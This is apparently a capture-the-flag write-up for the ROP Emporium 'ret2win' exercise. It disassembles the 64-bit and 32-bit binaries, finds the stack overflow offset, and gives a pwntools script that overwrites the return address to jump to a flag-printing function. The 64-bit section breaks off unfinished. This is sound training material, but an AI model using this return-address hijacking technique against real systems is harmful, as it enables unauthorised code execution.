## 64 bits

Executing the program

```bash
$ ./ret2win 
ret2win by ROP Emporium
x86_64

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> hello
Thank you!

Exiting

```

<br/>

Let's see the functions with radare2

```bash
[0x004005b0]> afl                                                                                        
0x004005b0    1 42           entry0                                                                      
0x004005f0    4 42   -> 37   sym.deregister_tm_clones                                                    
0x00400620    4 58   -> 55   sym.register_tm_clones                                                      
0x00400660    3 34   -> 29   entry.fini0                                                                 
0x00400690    1 7            entry.init0                                                                 
0x004006e8    1 110          sym.pwnme                                                                   
0x00400580    1 6            sym.imp.memset                                                              
0x00400550    1 6            sym.imp.puts                                                                
0x00400570    1 6            sym.imp.printf                                                              
0x00400590    1 6            sym.imp.read                                                                
0x00400756    1 27           sym.ret2win                                                                 
0x00400560    1 6            sym.imp.system                                                              
0x004007f0    1 2            sym.__libc_csu_fini                                                         
0x004007f4    1 9            sym._fini                                                                   
0x00400780    4 101          sym.__libc_csu_init                                                         
0x004005e0    1 2            sym._dl_relocate_static_pie                                                 
0x00400697    1 81           main                   
0x004005a0    1 6            sym.imp.setvbuf                                                             
0x00400528    3 23           sym._init     
```

<br/>

Now i'll open it on gdb and see the assembly of the functions

<br/>

```bash
gef➤  checksec
[+] checksec for '/home/c3t/ctf/ropemporium/ret2win/64bits/ret2win'
Canary                        : ✘ 
NX                            : ✓ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : Partial
```

<br/>

main:

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x0000000000400697 <+0>:     push   rbp
   0x0000000000400698 <+1>:     mov    rbp,rsp
   0x000000000040069b <+4>:     mov    rax,QWORD PTR [rip+0x2009b6]        # 0x601058 <stdout@@GLIBC_2.2.5>
   0x00000000004006a2 <+11>:    mov    ecx,0x0
   0x00000000004006a7 <+16>:    mov    edx,0x2
   0x00000000004006ac <+21>:    mov    esi,0x0
   0x00000000004006b1 <+26>:    mov    rdi,rax
   0x00000000004006b4 <+29>:    call   0x4005a0 <setvbuf@plt>
   0x00000000004006b9 <+34>:    mov    edi,0x400808
   0x00000000004006be <+39>:    call   0x400550 <puts@plt>
   0x00000000004006c3 <+44>:    mov    edi,0x400820
   0x00000000004006c8 <+49>:    call   0x400550 <puts@plt>
   0x00000000004006cd <+54>:    mov    eax,0x0
   0x00000000004006d2 <+59>:    call   0x4006e8 <pwnme>
   0x00000000004006d7 <+64>:    mov    edi,0x400828
   0x00000000004006dc <+69>:    call   0x400550 <puts@plt>
   0x00000000004006e1 <+74>:    mov    eax,0x0
   0x00000000004006e6 <+79>:    pop    rbp
   0x00000000004006e7 <+80>:    ret    
End of assembler dump.
```

<br/>

pwnme:

```bash
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x00000000004006e8 <+0>:     push   rbp
   0x00000000004006e9 <+1>:     mov    rbp,rsp
   0x00000000004006ec <+4>:     sub    rsp,0x20
   0x00000000004006f0 <+8>:     lea    rax,[rbp-0x20]
   0x00000000004006f4 <+12>:    mov    edx,0x20
   0x00000000004006f9 <+17>:    mov    esi,0x0
   0x00000000004006fe <+22>:    mov    rdi,rax
   0x0000000000400701 <+25>:    call   0x400580 <memset@plt>
   0x0000000000400706 <+30>:    mov    edi,0x400838
   0x000000000040070b <+35>:    call   0x400550 <puts@plt>
   0x0000000000400710 <+40>:    mov    edi,0x400898
   0x0000000000400715 <+45>:    call   0x400550 <puts@plt>
   0x000000000040071a <+50>:    mov    edi,0x4008b8
   0x000000000040071f <+55>:    call   0x400550 <puts@plt>
   0x0000000000400724 <+60>:    mov    edi,0x400918
   0x0000000000400729 <+65>:    mov    eax,0x0
   0x000000000040072e <+70>:    call   0x400570 <printf@plt>
   0x0000000000400733 <+75>:    lea    rax,[rbp-0x20]
   0x0000000000400737 <+79>:    mov    edx,0x38
   0x000000000040073c <+84>:    mov    rsi,rax
   0x000000000040073f <+87>:    mov    edi,0x0
   0x0000000000400744 <+92>:    call   0x400590 <read@plt>
   0x0000000000400749 <+97>:    mov    edi,0x40091b
   0x000000000040074e <+102>:   call   0x400550 <puts@plt>
   0x0000000000400753 <+107>:   nop
   0x0000000000400754 <+108>:   leave  
   0x0000000000400755 <+109>:   ret    
End of assembler dump.
```

<br/>

ret2win:

```bash
gef➤  disas ret2win 
Dump of assembler code for function ret2win:
   0x0000000000400756 <+0>:     push   rbp
   0x0000000000400757 <+1>:     mov    rbp,rsp
   0x000000000040075a <+4>:     mov    edi,0x400926
   0x000000000040075f <+9>:     call   0x400550 <puts@plt>
   0x0000000000400764 <+14>:    mov    edi,0x400943
   0x0000000000400769 <+19>:    call   0x400560 <system@plt>
   0x000000000040076e <+24>:    nop
   0x000000000040076f <+25>:    pop    rbp
   0x0000000000400770 <+26>:    ret    
End of assembler dump.
gef➤  x/s 0x400943
0x400943:       "/bin/cat flag.txt"
```

ret2win does /bin/cat flag.txt, so let's try to jump here

<br/>

In pwnme there's a read, we can use this to overflow it, find the offset

```bash
gef➤  pattern create 50                                                                          [30/145]
[+] Generating a pattern of 50 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga
[+] Saved as '$_gef0'                                                                                    
gef➤  r                                             
Starting program: /home/c3t/ctf/ropemporium/ret2win/64bits/ret2win 
ret2win by ROP Emporium                             
x86_64                                                                                                                             
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?                                                                            
You there, may I have your input please? And don't worry about null bytes, we're using read()!
                                                                                                         
> aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaaga                                   
Thank you!

<br/>

## 32 bits

Executing the binary

```bash
$ ./ret2win32 
ret2win by ROP Emporium
x86

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> test
Thank you!

Exiting
```
<br/>

List of the functions with radare2

```bash
[0x08048430]> afl
0x08048430    1 50           entry0
0x08048463    1 4            fcn.08048463
0x080483f0    1 6            sym.imp.__libc_start_main
0x08048490    4 50   -> 41   sym.deregister_tm_clones
0x080484d0    4 58   -> 54   sym.register_tm_clones
0x08048510    3 34   -> 31   entry.fini0
0x08048540    1 6            entry.init0
0x080485ad    1 127          sym.pwnme
0x08048410    1 6            sym.imp.memset
0x080483d0    1 6            sym.imp.puts
0x080483c0    1 6            sym.imp.printf
0x080483b0    1 6            sym.imp.read
0x0804862c    1 41           sym.ret2win
0x080483e0    1 6            sym.imp.system
0x080486c0    1 2            sym.__libc_csu_fini
0x08048480    1 4            sym.__x86.get_pc_thunk.bx
0x080486c4    1 20           sym._fini
0x08048660    4 93           sym.__libc_csu_init
0x08048470    1 2            sym._dl_relocate_static_pie
0x08048546    1 103          main
0x08048400    1 6            sym.imp.setvbuf
0x08048374    3 35           sym._init

```

<br/>

Now i'll see the assembly of the functions with gdb

<br/>

main:

```bash
gef➤  disas main
Dump of assembler code for function main:
   0x08048546 <+0>:     lea    ecx,[esp+0x4]
   0x0804854a <+4>:     and    esp,0xfffffff0
   0x0804854d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08048550 <+10>:    push   ebp
   0x08048551 <+11>:    mov    ebp,esp
   0x08048553 <+13>:    push   ecx
   0x08048554 <+14>:    sub    esp,0x4
   0x08048557 <+17>:    mov    eax,ds:0x804a030
   0x0804855c <+22>:    push   0x0
   0x0804855e <+24>:    push   0x2
   0x08048560 <+26>:    push   0x0
   0x08048562 <+28>:    push   eax
   0x08048563 <+29>:    call   0x8048400 <setvbuf@plt>
   0x08048568 <+34>:    add    esp,0x10
   0x0804856b <+37>:    sub    esp,0xc
   0x0804856e <+40>:    push   0x80486e0
   0x08048573 <+45>:    call   0x80483d0 <puts@plt>
   0x08048578 <+50>:    add    esp,0x10
   0x0804857b <+53>:    sub    esp,0xc
   0x0804857e <+56>:    push   0x80486f8
   0x08048583 <+61>:    call   0x80483d0 <puts@plt>
   0x08048588 <+66>:    add    esp,0x10
   0x0804858b <+69>:    call   0x80485ad <pwnme>
   0x08048590 <+74>:    sub    esp,0xc
   0x08048593 <+77>:    push   0x80486fd
   0x08048598 <+82>:    call   0x80483d0 <puts@plt>
   0x0804859d <+87>:    add    esp,0x10
   0x080485a0 <+90>:    mov    eax,0x0
   0x080485a5 <+95>:    mov    ecx,DWORD PTR [ebp-0x4]
   0x080485a8 <+98>:    leave  
   0x080485a9 <+99>:    lea    esp,[ecx-0x4]
   0x080485ac <+102>:   ret    
End of assembler dump.
```

<br/>

pwnme:

```bash
gef➤  disas pwnme
Dump of assembler code for function pwnme:
   0x080485ad <+0>:     push   ebp
   0x080485ae <+1>:     mov    ebp,esp
   0x080485b0 <+3>:     sub    esp,0x28
   0x080485b3 <+6>:     sub    esp,0x4
   0x080485b6 <+9>:     push   0x20
   0x080485b8 <+11>:    push   0x0
   0x080485ba <+13>:    lea    eax,[ebp-0x28]
   0x080485bd <+16>:    push   eax
   0x080485be <+17>:    call   0x8048410 <memset@plt>
   0x080485c3 <+22>:    add    esp,0x10
   0x080485c6 <+25>:    sub    esp,0xc
   0x080485c9 <+28>:    push   0x8048708
   0x080485ce <+33>:    call   0x80483d0 <puts@plt>
   0x080485d3 <+38>:    add    esp,0x10
   0x080485d6 <+41>:    sub    esp,0xc
   0x080485d9 <+44>:    push   0x8048768
   0x080485de <+49>:    call   0x80483d0 <puts@plt>
   0x080485e3 <+54>:    add    esp,0x10
   0x080485e6 <+57>:    sub    esp,0xc
   0x080485e9 <+60>:    push   0x8048788
   0x080485ee <+65>:    call   0x80483d0 <puts@plt>
   0x080485f3 <+70>:    add    esp,0x10
   0x080485f6 <+73>:    sub    esp,0xc
   0x080485f9 <+76>:    push   0x80487e8
   0x080485fe <+81>:    call   0x80483c0 <printf@plt>
   0x08048603 <+86>:    add    esp,0x10
   0x08048606 <+89>:    sub    esp,0x4
   0x08048609 <+92>:    push   0x38
   0x0804860b <+94>:    lea    eax,[ebp-0x28]
   0x0804860e <+97>:    push   eax
   0x0804860f <+98>:    push   0x0
   0x08048611 <+100>:   call   0x80483b0 <read@plt>
   0x08048616 <+105>:   add    esp,0x10
   0x08048619 <+108>:   sub    esp,0xc
   0x0804861c <+111>:   push   0x80487eb
   0x08048621 <+116>:   call   0x80483d0 <puts@plt>
   0x08048626 <+121>:   add    esp,0x10
   0x08048629 <+124>:   nop
   0x0804862a <+125>:   leave  
   0x0804862b <+126>:   ret    
End of assembler dump.
```

<br/>

ret2win:

```bash
gef➤  disas ret2win 
Dump of assembler code for function ret2win:
   0x0804862c <+0>:     push   ebp
   0x0804862d <+1>:     mov    ebp,esp
   0x0804862f <+3>:     sub    esp,0x8
   0x08048632 <+6>:     sub    esp,0xc
   0x08048635 <+9>:     push   0x80487f6
   0x0804863a <+14>:    call   0x80483d0 <puts@plt>
   0x0804863f <+19>:    add    esp,0x10
   0x08048642 <+22>:    sub    esp,0xc
   0x08048645 <+25>:    push   0x8048813
   0x0804864a <+30>:    call   0x80483e0 <system@plt>
   0x0804864f <+35>:    add    esp,0x10
   0x08048652 <+38>:    nop
   0x08048653 <+39>:    leave  
   0x08048654 <+40>:    ret    
End of assembler dump.
gef➤  x/s 0x8048813
0x8048813:      "/bin/cat flag.txt"
```

<br/>

So you can overflow the pwnme function because of the read function, then jump to the ret2win to cat the flag

<br/>

Finding the offset

```bash
gef➤  pattern create 100                      
[+] Generating a pattern of 100 bytes                                                                                                                                                         
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef1'                                                                                                                                                                         
gef➤  r                                                                                                                                                                                       
Starting program: /home/c3t/ctf/ropemporium/ret2win/32bits/ret2win32 
ret2win by ROP Emporium                                                                        
x86                            
                                               
For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer! 
What could possibly go wrong?              
You there, may I have your input please? And don't worry about null bytes, we're using read()!

> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xb       
$ebx   : 0x0       
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd0d0  →  "maaanaaa"
$ebp   : 0x6161616b ("kaaa"?)
$esi   : 0xf7fb1000  →  0x001e6d6c
$edi   : 0xf7fb1000  →  0x001e6d6c
$eip   : 0x6161616c ("laaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------------------
gef➤  pattern search 0xffffd0d0
[+] Searching '0xffffd0d0'
[+] Found at offset 48 (little-endian search) likely
[+] Found at offset 45 (big-endian search) 
```

The offset is going to be 44 (48 doesn't work), now take the address of the ret2win func and make the exploit

```python
from pwn import *

p = process("./ret2win32")

pad = b'a'*44
cat_flag = p32(0x0804862c)

payload = pad + cat_flag

p.sendline(payload)
p.interactive()
```
